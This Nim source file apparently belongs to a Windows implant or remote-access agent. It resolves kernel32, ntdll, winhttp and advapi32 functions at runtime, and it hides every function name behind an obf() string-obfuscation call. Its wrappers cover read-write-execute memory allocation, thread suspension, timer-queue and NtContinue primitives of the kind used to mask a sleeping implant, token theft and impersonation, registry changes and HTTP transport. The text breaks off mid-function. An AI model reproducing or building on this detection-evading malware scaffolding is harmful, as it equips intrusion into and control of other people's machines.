import ../global
import utils

# ======================
# dynlib
# ======================
proc LoadLibraryA(lib: cstring): pointer {.stdcall, importc, dynlib: "kernel32".}
proc GetProcAddress(hMod, api: pointer): pointer {.stdcall, importc, dynlib: "kernel32".}

# ======================
# kernel32
# ======================
var k32mod: pointer

proc load*(api: string): pointer =
  # Loads kernel32 and returns the address of the named export
  if k32mod == nil:
    var k32 = obf("kernel32")
    k32mod = LoadLibraryA(cast[cstring](unsafeAddr(k32[0])))
  GetProcAddress(k32mod, cast[pointer](cast[cstring](unsafeAddr(api[0]))))

template k32fn(T: typedesc; name: string; cache: untyped): untyped =
  # Loads the kernel32 export once and returns the cached pointer
  if cache == nil: cache = cast[T](load(name))
  cache

var
  fnCreateFileW: TCreateFileW
  fnReadFile: TReadFile
  fnWriteFile: TWriteFile
  fnGetLastError: TGetLastError
  fnCreateFileA: TCreateFileA
  fnCreateNamedPipeA: TCreateNamedPipeA
  fnConnectNamedPipe: TConnectNamedPipe
  fnDisconnectNamedPipe: TDisconnectNamedPipe
  fnFlushFileBuffers: TFlushFileBuffers
  fnWaitNamedPipeA: TWaitNamedPipeA
  fnPeekNamedPipe: TPeekNamedPipe
  fnCloseHandle: TCloseHandle
  fnGetFileSize: TGetFileSize
  fnVirtualAlloc: TVirtualAlloc
  fnVirtualFree: TVirtualFree
  fnGetModuleHandleA: TGetModuleHandleA
  fnVirtualProtect: TVirtualProtect
  fnGetCurrentDirectoryW: TGetCurrentDirectoryW
  fnSetCurrentDirectoryW: TSetCurrentDirectoryW
  fnFindFirstFileW: TFindFirstFileW
  fnFindNextFileW: TFindNextFileW
  fnFindClose: TFindClose
  fnFileTimeToSystemTime: TFileTimeToSystemTime
  fnCreateDirectoryW: TCreateDirectoryW
  fnRemoveDirectoryW: TRemoveDirectoryW
  fnDeleteFileW: TDeleteFileW
  fnCopyFileW: TCopyFileW
  fnMoveFileW: TMoveFileW
  fnGetFileAttributesW: TGetFileAttributesW
  fnGetEnvironmentVariableW: TGetEnvironmentVariableW
  fnGetEnvironmentStringsW: TGetEnvironmentStringsW
  fnFreeEnvironmentStringsW: TFreeEnvironmentStringsW
  fnCreateProcessW: TCreateProcessW
  fnCreatePipe: TCreatePipe
  fnSetHandleInformation: TSetHandleInformation
  fnGetStdHandle: TGetStdHandle
  fnSetStdHandle: TSetStdHandle
  fnLoadLibraryA: TLoadLibraryA
  fnGetProcAddress: TGetProcAddress
  fnFreeLibrary: TFreeLibrary
  fnCreateProcessA: TCreateProcessA
  fnMultiByteToWideChar: TMultiByteToWideChar
  fnGetExitCodeThread: TGetExitCodeThread
  fnExitThread: TExitThread
  fnAddVectoredExceptionHandler: TAddVectoredExceptionHandler
  fnRemoveVectoredExceptionHandler: TRemoveVectoredExceptionHandler
  fnSetThreadStackGuarantee: TSetThreadStackGuarantee
  fnResumeThread: TResumeThread
  fnSuspendThread: TSuspendThread
  fnGetCurrentProcessId: TGetCurrentProcessId
  fnDuplicateHandle: TDuplicateHandle
  fnGetCurrentThreadId: TGetCurrentThreadId
  fnGetCurrentThread: TGetCurrentThread
  fnOpenThread: TOpenThread
  fnTerminateThread: TTerminateThread
  fnSleep: TSleep
  fnGetLogicalDriveStringsW: TGetLogicalDriveStringsW
  fnGetComputerNameExW: TGetComputerNameExW
  fnGetNativeSystemInfo: TGetNativeSystemInfo
  fnGlobalMemoryStatusEx: TGlobalMemoryStatusEx
  fnCreateToolhelp32Snapshot: TCreateToolhelp32Snapshot
  fnProcess32FirstW: TProcess32FirstW
  fnProcess32NextW: TProcess32NextW
  fnQueryDosDeviceW: TQueryDosDeviceW
  fnGetDriveTypeW: TGetDriveTypeW
  fnGetTickCount: TGetTickCount
  fnGetTickCount64: TGetTickCount64
  fnGetProcessTimes: TGetProcessTimes
  fnIsWow64Process: TIsWow64Process
  fnQueryFullProcessImageNameW: TQueryFullProcessImageNameW
  fnK32GetProcessMemoryInfo: TK32GetProcessMemoryInfo
  fnGetModuleFileNameW: TGetModuleFileNameW
  fnGetPriorityClass: TGetPriorityClass
  fnGetProcessHandleCount: TGetProcessHandleCount
  fnModule32FirstW: TModule32FirstW
  fnModule32NextW: TModule32NextW
  fnWaitForSingleObjectEx: TWaitForSingleObjectEx
  fnRtlCreateTimerQueue: TRtlCreateTimerQueue
  fnRtlCreateTimer: TRtlCreateTimer
  fnRtlDeleteTimerQueue: TRtlDeleteTimerQueue
  fnRtlDeleteTimerQueueEx: TRtlDeleteTimerQueueEx
  fnRtlRegisterWait: TRtlRegisterWait
  fnRtlDeregisterWait: TRtlDeregisterWait
  fnRtlCaptureContext: TRtlCaptureContext
  fnNtContinue: TNtContinue
  fnNtSetEvent: TNtSetEvent
  fnNtCreateEvent: TNtCreateEvent
  fnNtWait: TNtWait
  fnNtSignalAndWait: TNtSignalAndWait
  fnNtClose: TNtClose
  fnLocalFree: TLocalFree

proc createFileW*(path: pointer; access, share: culong; sec: pointer; disp, flags, tmpl: culong): pointer =
  # Opens or creates a file from a wide path
  k32fn(TCreateFileW, obf("CreateFileW"), fnCreateFileW)(path, access, share, sec, disp, flags, tmpl)

proc readFile*(h, buf: pointer; sz: culong; read: ptr culong; ov: pointer): culong =
  # Reads bytes from the file handle
  k32fn(TReadFile, obf("ReadFile"), fnReadFile)(h, buf, sz, read, ov)

proc writeFile*(h, buf: pointer; sz: culong; written: ptr culong; ov: pointer): culong =
  # Writes bytes to the file handle
  k32fn(TWriteFile, obf("WriteFile"), fnWriteFile)(h, buf, sz, written, ov)

proc getLastError*(): culong =
  # Returns the last error code
  k32fn(TGetLastError, obf("GetLastError"), fnGetLastError)()

proc createFileA*(path: pointer; access, share: culong; sec: pointer; disp, flags, tmpl: culong): pointer =
  # Opens or creates a file from an ansi path
  k32fn(TCreateFileA, obf("CreateFileA"), fnCreateFileA)(path, access, share, sec, disp, flags, tmpl)

proc createNamedPipeA*(name: pointer; openMode, pipeMode: culong; maxInst, outBuf, inBuf, timeout: culong; sa: pointer): pointer =
  # Creates a named pipe
  k32fn(TCreateNamedPipeA, obf("CreateNamedPipeA"), fnCreateNamedPipeA)(name, openMode, pipeMode, maxInst, outBuf, inBuf, timeout, sa)

proc connectNamedPipe*(h, ov: pointer): culong =
  # Waits for a client to connect to the pipe
  k32fn(TConnectNamedPipe, obf("ConnectNamedPipe"), fnConnectNamedPipe)(h, ov)

proc disconnectNamedPipe*(h: pointer): culong =
  # Disconnects the client from the pipe
  k32fn(TDisconnectNamedPipe, obf("DisconnectNamedPipe"), fnDisconnectNamedPipe)(h)

proc flushFileBuffers*(h: pointer): int32 =
  # Flushes buffered data for the file handle
  k32fn(TFlushFileBuffers, obf("FlushFileBuffers"), fnFlushFileBuffers)(h)

proc waitNamedPipeA*(name: pointer; timeout: culong): culong =
  # Waits until the named pipe can be opened
  k32fn(TWaitNamedPipeA, obf("WaitNamedPipeA"), fnWaitNamedPipeA)(name, timeout)

proc peekNamedPipe*(h, buf: pointer; bufSize: culong; bytesRead, totalAvail, bytesLeft: ptr culong): culong =
  # Peeks at data waiting in the pipe
  k32fn(TPeekNamedPipe, obf("PeekNamedPipe"), fnPeekNamedPipe)(h, buf, bufSize, bytesRead, totalAvail, bytesLeft)

proc closeHandle*(h: pointer): culong =
  # Closes the handle
  k32fn(TCloseHandle, obf("CloseHandle"), fnCloseHandle)(h)

proc getFileSize*(h: pointer; hi: ptr culong): culong =
  # Returns the size of the file
  k32fn(TGetFileSize, obf("GetFileSize"), fnGetFileSize)(h, hi)

proc allocRwx*(sz: csize_t): pointer =
  # Allocates read write execute memory
  k32fn(TVirtualAlloc, obf("VirtualAlloc"), fnVirtualAlloc)(nil, sz, 0x3000, 0x40)

proc allocRw*(sz: csize_t): pointer =
  # Allocates read write memory
  k32fn(TVirtualAlloc, obf("VirtualAlloc"), fnVirtualAlloc)(nil, sz, 0x3000, 0x04)

proc freeMem*(p: pointer): culong =
  # Frees the allocated memory
  k32fn(TVirtualFree, obf("VirtualFree"), fnVirtualFree)(p, 0, 0x8000)

proc getModuleHandleA*(name: string = ""; currentModule: bool = false): pointer =
  # Returns the module handle for the name or for the current module
  let fn = k32fn(TGetModuleHandleA, obf("GetModuleHandleA"), fnGetModuleHandleA)
  if currentModule:
    fn(nil)
  else:
    fn(cast[cstring](unsafeAddr(name[0])))

proc virtualProtect*(lp: pointer; sz: culong; np: culong; old: var culong): culong =
  # Changes the protection of the memory region
  k32fn(TVirtualProtect, obf("VirtualProtect"), fnVirtualProtect)(lp, sz, np, addr old)

proc getCurrentDirectoryW*(n: culong; buf: pointer): culong =
  # Returns the current directory path
  k32fn(TGetCurrentDirectoryW, obf("GetCurrentDirectoryW"), fnGetCurrentDirectoryW)(n, buf)

proc setCurrentDirectoryW*(path: pointer): culong =
  # Sets the current directory path
  k32fn(TSetCurrentDirectoryW, obf("SetCurrentDirectoryW"), fnSetCurrentDirectoryW)(path)

proc findFirstFileW*(path, data: pointer): pointer =
  # Starts a search for files matching the path
  k32fn(TFindFirstFileW, obf("FindFirstFileW"), fnFindFirstFileW)(path, data)

proc findNextFileW*(h, data: pointer): culong =
  # Continues the file search
  k32fn(TFindNextFileW, obf("FindNextFileW"), fnFindNextFileW)(h, data)

proc findClose*(h: pointer): culong =
  # Closes the file search handle
  k32fn(TFindClose, obf("FindClose"), fnFindClose)(h)

proc fileTimeToSystemTime*(ft, st: pointer): culong =
  # Converts a file time into a system time
  k32fn(TFileTimeToSystemTime, obf("FileTimeToSystemTime"), fnFileTimeToSystemTime)(ft, st)

proc createDirectoryW*(path, sec: pointer): culong =
  # Creates a directory
  k32fn(TCreateDirectoryW, obf("CreateDirectoryW"), fnCreateDirectoryW)(path, sec)

proc removeDirectoryW*(path: pointer): culong =
  # Removes a directory
  k32fn(TRemoveDirectoryW, obf("RemoveDirectoryW"), fnRemoveDirectoryW)(path)

proc deleteFileW*(path: pointer): culong =
  # Deletes a file
  k32fn(TDeleteFileW, obf("DeleteFileW"), fnDeleteFileW)(path)

proc copyFileW*(src, dst: pointer; fail: culong): culong =
  # Copies a file to a new path
  k32fn(TCopyFileW, obf("CopyFileW"), fnCopyFileW)(src, dst, fail)

proc moveFileW*(src, dst, a, b: pointer; flags: culong): culong =
  # Moves a file to a new path
  k32fn(TMoveFileW, obf("MoveFileW"), fnMoveFileW)(src, dst, a, b, flags)

proc getFileAttributesW*(path: pointer): culong =
  # Returns the attributes of the file
  k32fn(TGetFileAttributesW, obf("GetFileAttributesW"), fnGetFileAttributesW)(path)

proc getEnvironmentVariableW*(name, val: pointer; sz: culong): culong =
  # Reads an environment variable
  k32fn(TGetEnvironmentVariableW, obf("GetEnvironmentVariableW"), fnGetEnvironmentVariableW)(name, val, sz)

proc getEnvironmentStringsW*(): pointer =
  # Returns the environment block
  k32fn(TGetEnvironmentStringsW, obf("GetEnvironmentStringsW"), fnGetEnvironmentStringsW)()

proc freeEnvironmentStringsW*(env: pointer): culong =
  # Frees the environment block
  k32fn(TFreeEnvironmentStringsW, obf("FreeEnvironmentStringsW"), fnFreeEnvironmentStringsW)(env)

proc createProcessW*(app, cmd: pointer; procAttr, threadAttr: pointer; inherit, flags: culong; env, curDir, si, pi: pointer): culong =
  # Creates a process from wide strings
  k32fn(TCreateProcessW, obf("CreateProcessW"), fnCreateProcessW)(app, cmd, procAttr, threadAttr, inherit, flags, env, curDir, si, pi)

proc createPipe*(hRead, hWrite: ptr pointer; sa: pointer; size: culong): culong =
  # Creates an anonymous pipe
  k32fn(TCreatePipe, obf("CreatePipe"), fnCreatePipe)(hRead, hWrite, sa, size)

proc setHandleInformation*(h: pointer; mask, flags: culong): culong =
  # Sets flags on the handle
  k32fn(TSetHandleInformation, obf("SetHandleInformation"), fnSetHandleInformation)(h, mask, flags)

proc getStdHandle*(std: culong): pointer =
  # Returns a standard handle
  k32fn(TGetStdHandle, obf("GetStdHandle"), fnGetStdHandle)(std)

proc setStdHandle*(std: culong; h: pointer): culong =
  # Sets a standard handle
  k32fn(TSetStdHandle, obf("SetStdHandle"), fnSetStdHandle)(std, h)

proc loadLibraryA*(lib: string): pointer =
  # Loads a library by name
  k32fn(TLoadLibraryA, obf("LoadLibraryA"), fnLoadLibraryA)(cast[cstring](unsafeAddr(lib[0])))

proc getProcAddress*(hMod: pointer; name: string): pointer =
  # Returns the address of an export in the module
  k32fn(TGetProcAddress, obf("GetProcAddress"), fnGetProcAddress)(
    hMod, cast[pointer](cast[cstring](unsafeAddr(name[0]))))

proc freeLibrary*(hMod: pointer): culong =
  # Unloads the library
  k32fn(TFreeLibrary, obf("FreeLibrary"), fnFreeLibrary)(hMod)

proc createProcessA*(app, cmd: pointer; procAttr, threadAttr: pointer; inherit, flags: culong; env, curDir, si, pi: pointer): culong =
  # Creates a process from ansi strings
  k32fn(TCreateProcessA, obf("CreateProcessA"), fnCreateProcessA)(app, cmd, procAttr, threadAttr, inherit, flags, env, curDir, si, pi)

proc multiByteToWideChar*(cp, flags: culong; src: cstring; srcLen: cint; dst: pointer; dstLen: cint): cint =
  # Converts a multibyte string into wide characters
  k32fn(TMultiByteToWideChar, obf("MultiByteToWideChar"), fnMultiByteToWideChar)(cp, flags, src, srcLen, dst, dstLen)

proc getExitCodeThread*(h: pointer; code: ptr culong): culong =
  # Returns the exit code of the thread
  k32fn(TGetExitCodeThread, obf("GetExitCodeThread"), fnGetExitCodeThread)(h, code)

proc exitThread*(code: culong) =
  # Exits the current thread
  k32fn(TExitThread, obf("ExitThread"), fnExitThread)(code)

proc addVectoredExceptionHandler*(first: culong; handler: pointer): pointer =
  # Registers a vectored exception handler
  k32fn(TAddVectoredExceptionHandler, obf("AddVectoredExceptionHandler"), fnAddVectoredExceptionHandler)(first, handler)

proc removeVectoredExceptionHandler*(handle: pointer): culong =
  # Removes a vectored exception handler
  k32fn(TRemoveVectoredExceptionHandler, obf("RemoveVectoredExceptionHandler"), fnRemoveVectoredExceptionHandler)(handle)

proc setThreadStackGuarantee*(stackBytes: ptr culong): culong =
  # Sets the guaranteed stack size for the thread
  k32fn(TSetThreadStackGuarantee, obf("SetThreadStackGuarantee"), fnSetThreadStackGuarantee)(stackBytes)

proc resumeThread*(h: pointer): culong =
  # Resumes the thread
  k32fn(TResumeThread, obf("ResumeThread"), fnResumeThread)(h)

proc suspendThread*(h: pointer): culong =
  # Suspends the thread
  k32fn(TSuspendThread, obf("SuspendThread"), fnSuspendThread)(h)

proc getCurrentProcessId*(): culong =
  # Returns the current process id
  k32fn(TGetCurrentProcessId, obf("GetCurrentProcessId"), fnGetCurrentProcessId)()

proc duplicateHandle*(
    hSourceProcessHandle, hSourceHandle, hTargetProcessHandle: pointer;
    lpTargetHandle: ptr pointer;
    dwDesiredAccess, bInheritHandle, dwOptions: culong): culong =
  # Duplicates a handle into another process
  k32fn(TDuplicateHandle, obf("DuplicateHandle"), fnDuplicateHandle)(
    hSourceProcessHandle, hSourceHandle, hTargetProcessHandle,
    lpTargetHandle, dwDesiredAccess, bInheritHandle, dwOptions)

proc getCurrentThreadId*(): culong =
  # Returns the current thread id
  k32fn(TGetCurrentThreadId, obf("GetCurrentThreadId"), fnGetCurrentThreadId)()

proc openThread*(access, inherit, tid: culong): pointer =
  # Opens a thread handle
  k32fn(TOpenThread, obf("OpenThread"), fnOpenThread)(access, inherit, tid)

proc terminateThread*(h: pointer; code: culong): culong =
  # Terminates the thread
  k32fn(TTerminateThread, obf("TerminateThread"), fnTerminateThread)(h, code)

proc sleepMs*(ms: culong) =
  # Sleeps for the given number of milliseconds
  k32fn(TSleep, obf("Sleep"), fnSleep)(ms)

proc getLogicalDriveStringsW*(n: culong; buf: pointer): culong =
  # Returns the list of logical drive strings
  k32fn(TGetLogicalDriveStringsW, obf("GetLogicalDriveStringsW"), fnGetLogicalDriveStringsW)(n, buf)

proc getComputerNameExW*(nameType: culong; buf: pointer; size: ptr culong): culong =
  # Returns the computer name
  k32fn(TGetComputerNameExW, obf("GetComputerNameExW"), fnGetComputerNameExW)(nameType, buf, size)

proc getNativeSystemInfo*(lpSystemInfo: pointer) =
  # Fills the native system information
  k32fn(TGetNativeSystemInfo, obf("GetNativeSystemInfo"), fnGetNativeSystemInfo)(lpSystemInfo)

proc globalMemoryStatusEx*(lpBuffer: pointer): culong =
  # Fills the global memory status
  k32fn(TGlobalMemoryStatusEx, obf("GlobalMemoryStatusEx"), fnGlobalMemoryStatusEx)(lpBuffer)

proc createToolhelp32Snapshot*(flags, processId: culong): pointer =
  # Takes a snapshot of processes or modules
  k32fn(TCreateToolhelp32Snapshot, obf("CreateToolhelp32Snapshot"), fnCreateToolhelp32Snapshot)(flags, processId)

proc process32FirstW*(hSnapshot: pointer; lppe: pointer): culong =
  # Reads the first process in the snapshot
  k32fn(TProcess32FirstW, obf("Process32FirstW"), fnProcess32FirstW)(hSnapshot, lppe)

proc process32NextW*(hSnapshot: pointer; lppe: pointer): culong =
  # Reads the next process in the snapshot
  k32fn(TProcess32NextW, obf("Process32NextW"), fnProcess32NextW)(hSnapshot, lppe)

proc queryDosDeviceW*(device, target: pointer; n: culong): culong =
  # Resolves a dos device name to its target path
  k32fn(TQueryDosDeviceW, obf("QueryDosDeviceW"), fnQueryDosDeviceW)(device, target, n)

proc getTickCount*(): culong =
  # Returns the tick count in milliseconds
  k32fn(TGetTickCount, obf("GetTickCount"), fnGetTickCount)()

proc getTickCount64*(): uint64 =
  # Returns the tick count as a 64 bit value
  k32fn(TGetTickCount64, obf("GetTickCount64"), fnGetTickCount64)()

proc getProcessTimes*(hProcess: pointer; lpCreationTime, lpExitTime, lpKernelTime, lpUserTime: pointer): culong =
  # Reads the process time counters
  k32fn(TGetProcessTimes, obf("GetProcessTimes"), fnGetProcessTimes)(hProcess, lpCreationTime, lpExitTime, lpKernelTime, lpUserTime)

proc isWow64Process*(hProcess: pointer; wow64Process: ptr culong): culong =
  # Checks whether the process runs under wow64
  k32fn(TIsWow64Process, obf("IsWow64Process"), fnIsWow64Process)(hProcess, wow64Process)

proc queryFullProcessImageNameW*(hProcess: pointer; dwFlags: culong; lpExeName: pointer; lpdwSize: ptr culong): culong =
  # Returns the full image path of the process
  k32fn(TQueryFullProcessImageNameW, obf("QueryFullProcessImageNameW"), fnQueryFullProcessImageNameW)(hProcess, dwFlags, lpExeName, lpdwSize)

proc k32GetProcessMemoryInfo*(hProcess: pointer; ppsmemCounters: pointer; cb: culong): culong =
  # Reads the memory counters of the process
  k32fn(TK32GetProcessMemoryInfo, obf("K32GetProcessMemoryInfo"), fnK32GetProcessMemoryInfo)(hProcess, ppsmemCounters, cb)

proc getModuleFileNameW*(hModule: pointer; lpFilename: pointer; nSize: culong): culong =
  # Returns the file path of the module
  k32fn(TGetModuleFileNameW, obf("GetModuleFileNameW"), fnGetModuleFileNameW)(hModule, lpFilename, nSize)

proc getPriorityClass*(hProcess: pointer): culong =
  # Returns the priority class of the process
  k32fn(TGetPriorityClass, obf("GetPriorityClass"), fnGetPriorityClass)(hProcess)

proc getProcessHandleCount*(hProcess: pointer; pdwHandleCount: ptr culong): culong =
  # Returns the number of open handles in the process
  k32fn(TGetProcessHandleCount, obf("GetProcessHandleCount"), fnGetProcessHandleCount)(hProcess, pdwHandleCount)

proc module32FirstW*(hSnapshot: pointer; lpme: pointer): culong =
  # Reads the first module in the snapshot
  k32fn(TModule32FirstW, obf("Module32FirstW"), fnModule32FirstW)(hSnapshot, lpme)

proc module32NextW*(hSnapshot: pointer; lpme: pointer): culong =
  # Reads the next module in the snapshot
  k32fn(TModule32NextW, obf("Module32NextW"), fnModule32NextW)(hSnapshot, lpme)

proc waitForSingleObjectEx*(h: pointer; ms: culong; alertable: culong = 0): culong =
  # Waits until the object is signaled or the timeout ends
  k32fn(TWaitForSingleObjectEx, obf("WaitForSingleObjectEx"), fnWaitForSingleObjectEx)(h, ms, alertable)

var ntmod: pointer

proc ntload(api: string): pointer =
  # Loads ntdll and returns the address of the named export
  if ntmod == nil: ntmod = getModuleHandleA(obf("ntdll.dll"))
  getProcAddress(ntmod, api)

template ntfn(T: typedesc; name: string; cache: untyped): untyped =
  # Loads the ntdll export once and returns the cached pointer
  if cache == nil: cache = cast[T](ntload(name))
  cache

proc rtlCreateTimerQueue*(): pointer =
  # Creates a timer queue and returns its handle
  var q: pointer
  if ntfn(TRtlCreateTimerQueue, obf("RtlCreateTimerQueue"), fnRtlCreateTimerQueue)(addr q) != 0: nil
  else: q

proc rtlCreateTimer*(queue: pointer; cb, ctx: pointer; due, period, flags: culong): culong =
  # Creates a timer on the queue
  var t: pointer
  ntfn(TRtlCreateTimer, obf("RtlCreateTimer"), fnRtlCreateTimer)(queue, addr t, cb, ctx, due, period, flags)

proc rtlDeleteTimerQueue*(queue: pointer): culong =
  # Deletes the timer queue
  ntfn(TRtlDeleteTimerQueue, obf("RtlDeleteTimerQueue"), fnRtlDeleteTimerQueue)(queue)

proc rtlDeleteTimerQueueEx*(queue, completionEvent: pointer): culong =
  # Deletes the timer queue and waits for completion
  ntfn(TRtlDeleteTimerQueueEx, obf("RtlDeleteTimerQueueEx"), fnRtlDeleteTimerQueueEx)(queue, completionEvent)

proc rtlRegisterWait*(handle: pointer; cb, ctx: pointer; ms, flags: culong; wait: ptr pointer = nil): culong =
  # Registers a wait callback and stores the wait handle
  var w: pointer
  result = ntfn(TRtlRegisterWait, obf("RtlRegisterWait"), fnRtlRegisterWait)(addr w, handle, cb, ctx, ms, flags)
  if wait != nil and result == 0: wait[] = w

proc rtlDeregisterWait*(wait: pointer): culong =
  # Removes the registered wait
  ntfn(TRtlDeregisterWait, obf("RtlDeregisterWait"), fnRtlDeregisterWait)(wait)

proc rtlCaptureContext*(): pointer =
  # Returns the address of RtlCaptureContext
  ntfn(TRtlCaptureContext, obf("RtlCaptureContext"), fnRtlCaptureContext)

proc ntContinue*(): pointer =
  # Returns the address of NtContinue
  ntfn(TNtContinue, obf("NtContinue"), fnNtContinue)

proc ntSetEvent*(): pointer =
  # Returns the address of NtSetEvent
  ntfn(TNtSetEvent, obf("NtSetEvent"), fnNtSetEvent)

proc signalNtEvent*(ev: pointer): culong =
  # Signals the event through NtSetEvent
  let fn = ntfn(TNtSetEvent, obf("NtSetEvent"), fnNtSetEvent)
  if fn == nil: return 0xC0000225'u32
  fn(ev, nil)

proc createNtEvent*(h: ptr pointer; access, typ, state: culong): culong =
  # Creates an event through NtCreateEvent
  let fn = ntfn(TNtCreateEvent, obf("NtCreateEvent"), fnNtCreateEvent)
  if fn == nil: return 0xC0000225'u32
  fn(h, access, nil, typ, state)

proc waitNtObject*(h: pointer): culong =
  # Waits on the object through NtWaitForSingleObject
  let fn = ntfn(TNtWait, obf("NtWaitForSingleObject"), fnNtWait)
  if fn == nil: return 0xC0000225'u32
  fn(h, 0, nil)

proc signalAndWaitNt*(sig, wait: pointer): culong =
  # Signals one object and waits on another
  let fn = ntfn(TNtSignalAndWait, obf("NtSignalAndWaitForSingleObject"), fnNtSignalAndWait)
  if fn == nil: return 0xC0000225'u32
  fn(sig, wait, 0, nil)

proc closeNtObject*(h: pointer): culong =
  # Closes the object handle through NtClose
  if h == nil: return 0
  let fn = ntfn(TNtClose, obf("NtClose"), fnNtClose)
  if fn == nil: return 0xC0000225'u32
  fn(h)

# ======================
# winhttp
# ======================
var whmod: pointer

proc whload(api: string): pointer =
  # Loads winhttp and returns the address of the named export
  if whmod == nil: whmod = loadLibraryA(obf("winhttp"))
  getProcAddress(whmod, api)

template whfn(T: typedesc; name: string; cache: untyped): untyped =
  # Loads the winhttp export once and returns the cached pointer
  if cache == nil: cache = cast[T](whload(name))
  cache

var
  fnWinHttpOpen: TWinHttpOpen
  fnWinHttpConnect: TWinHttpConnect
  fnWinHttpOpenRequest: TWinHttpOpenRequest
  fnWinHttpSendRequest: TWinHttpSendRequest
  fnWinHttpReceiveResponse: TWinHttpReceiveResponse
  fnWinHttpQueryHeaders: TWinHttpQueryHeaders
  fnWinHttpReadData: TWinHttpReadData
  fnWinHttpCloseHandle: TWinHttpCloseHandle
  fnWinHttpSetOption: TWinHttpSetOption
  fnWinHttpAddRequestHeaders: TWinHttpAddRequestHeaders

proc winHttpOpen*(agent: pointer; access: culong; proxy, bypass: pointer; flags: culong): pointer =
  # Opens a winhttp session
  whfn(TWinHttpOpen, obf("WinHttpOpen"), fnWinHttpOpen)(agent, access, proxy, bypass, flags)

proc winHttpConnect*(session: pointer; host: pointer; port: uint16; flags: culong): pointer =
  # Opens a connection to the host
  whfn(TWinHttpConnect, obf("WinHttpConnect"), fnWinHttpConnect)(session, host, port, flags)

proc winHttpOpenRequest*(conn: pointer; verb, path, version, referrer: pointer; accept: pointer; flags: culong): pointer =
  # Opens an http request on the connection
  whfn(TWinHttpOpenRequest, obf("WinHttpOpenRequest"), fnWinHttpOpenRequest)(conn, verb, path, version, referrer, accept, flags)

proc winHttpSendRequest*(req: pointer; headers: pointer; hlen: culong; body: pointer; blen, total: culong; ctx: culong): culong =
  # Sends the http request
  whfn(TWinHttpSendRequest, obf("WinHttpSendRequest"), fnWinHttpSendRequest)(req, headers, hlen, body, blen, total, ctx)

proc winHttpReceiveResponse*(req: pointer; reserved: pointer): culong =
  # Waits for the http response
  whfn(TWinHttpReceiveResponse, obf("WinHttpReceiveResponse"), fnWinHttpReceiveResponse)(req, reserved)

proc winHttpQueryHeaders*(req: pointer; level: culong; name: pointer; buf: pointer; blen: ptr culong; idx: ptr culong): culong =
  # Reads headers from the http response
  whfn(TWinHttpQueryHeaders, obf("WinHttpQueryHeaders"), fnWinHttpQueryHeaders)(req, level, name, buf, blen, idx)

proc winHttpReadData*(req: pointer; buf: pointer; toRead: culong; read: ptr culong): culong =
  # Reads body bytes from the http response
  whfn(TWinHttpReadData, obf("WinHttpReadData"), fnWinHttpReadData)(req, buf, toRead, read)

proc winHttpCloseHandle*(h: pointer): culong =
  # Closes the winhttp handle
  whfn(TWinHttpCloseHandle, obf("WinHttpCloseHandle"), fnWinHttpCloseHandle)(h)

proc winHttpSetOption*(h: pointer; opt: culong; buf: pointer; blen: culong): culong =
  # Sets an option on the winhttp handle
  whfn(TWinHttpSetOption, obf("WinHttpSetOption"), fnWinHttpSetOption)(h, opt, buf, blen)

proc winHttpAddRequestHeaders*(req: pointer; headers: pointer; hlen: culong; mods: culong): culong =
  # Adds headers to the http request
  whfn(TWinHttpAddRequestHeaders, obf("WinHttpAddRequestHeaders"), fnWinHttpAddRequestHeaders)(req, headers, hlen, mods)

# ======================
# advapi32
# ======================
var advmod: pointer

proc advload(api: string): pointer =
  # Loads advapi32 and returns the address of the named export
  if advmod == nil: advmod = loadLibraryA(obf("advapi32"))
  getProcAddress(advmod, api)

template advfn(T: typedesc; name: string; cache: untyped): untyped =
  # Loads the advapi32 export once and returns the cached pointer
  if cache == nil: cache = cast[T](advload(name))
  cache

var
  fnSetThreadToken: TSetThreadToken
  fnRevertToSelf: TRevertToSelf
  fnImpersonateLoggedOnUser: TImpersonateLoggedOnUser
  fnLogonUserW: TLogonUserW
  fnDuplicateTokenEx: TDuplicateTokenEx
  fnCreateProcessAsUserW: TCreateProcessAsUserW
  fnCreateProcessWithTokenW: TCreateProcessWithTokenW
  fnCreateProcessWithLogonW: TCreateProcessWithLogonW
  fnOpenThreadToken: TOpenThreadToken
  fnOpenSCManagerA: TOpenSCManagerA
  fnOpenServiceA: TOpenServiceA
  fnQueryServiceStatusEx: TQueryServiceStatusEx
  fnStartServiceA: TStartServiceA
  fnLookupPrivilegeValueW: TLookupPrivilegeValueW
  fnLookupPrivilegeNameW: TLookupPrivilegeNameW
  fnLookupAccountSidW: TLookupAccountSidW
  fnGetSidSubAuthorityCount: TGetSidSubAuthorityCount
  fnGetSidSubAuthority: TGetSidSubAuthority
  fnGetSidIdentifierAuthority: TGetSidIdentifierAuthority
  fnRegOpenKeyExW: TRegOpenKeyExW
  fnRegCreateKeyExW: TRegCreateKeyExW
  fnRegSetValueExW: TRegSetValueExW
  fnRegQueryValueExW: TRegQueryValueExW
  fnRegDeleteValueW: TRegDeleteValueW
  fnRegDeleteKeyW: TRegDeleteKeyW
  fnRegQueryInfoKeyW: TRegQueryInfoKeyW
  fnRegEnumKeyExW: TRegEnumKeyExW
  fnRegEnumValueW: TRegEnumValueW
  fnRegCloseKey: TRegCloseKey
  fnGetUserNameW: TGetUserNameW
  fnGetNamedSecurityInfoW: TGetNamedSecurityInfoW
  fnGetAce: TGetAce
  fnConvertSidToStringSidW: TConvertSidToStringSidW

proc setThreadToken*(thread: pointer; token: pointer): culong =
  # Assigns a token to the thread
  advfn(TSetThreadToken, obf("SetThreadToken"), fnSetThreadToken)(thread, token)

proc revertToSelf*(): culong =
  # Ends the current impersonation
  advfn(TRevertToSelf, obf("RevertToSelf"), fnRevertToSelf)()

proc impersonateLoggedOnUser*(token: pointer): culong =
  # Impersonates the user of the token
  advfn(TImpersonateLoggedOnUser, obf("ImpersonateLoggedOnUser"), fnImpersonateLoggedOnUser)(token)

proc logonUserW*(
    user, domain, password: pointer; logonType, provider: culong; token: ptr pointer): culong =
  # Logs on a user and returns a token
  advfn(TLogonUserW, obf("LogonUserW"), fnLogonUserW)(user, domain, password, logonType, provider, token)

proc duplicateTokenEx*(existing: pointer; access: culong; sa: pointer; impLevel: culong; tokenType: culong; newToken: ptr pointer): culong =
  # Duplicates a token with the requested type
  advfn(TDuplicateTokenEx, obf("DuplicateTokenEx"), fnDuplicateTokenEx)(existing, access, sa, impLevel, tokenType, newToken)

proc createProcessAsUserW*(
    hToken, app, cmd: pointer; procAttr, threadAttr: pointer; inherit, flags: culong;
    env, curDir, si, pi: pointer): culong =
  # Creates a process with the user token
  advfn(TCreateProcessAsUserW, obf("CreateProcessAsUserW"), fnCreateProcessAsUserW)(
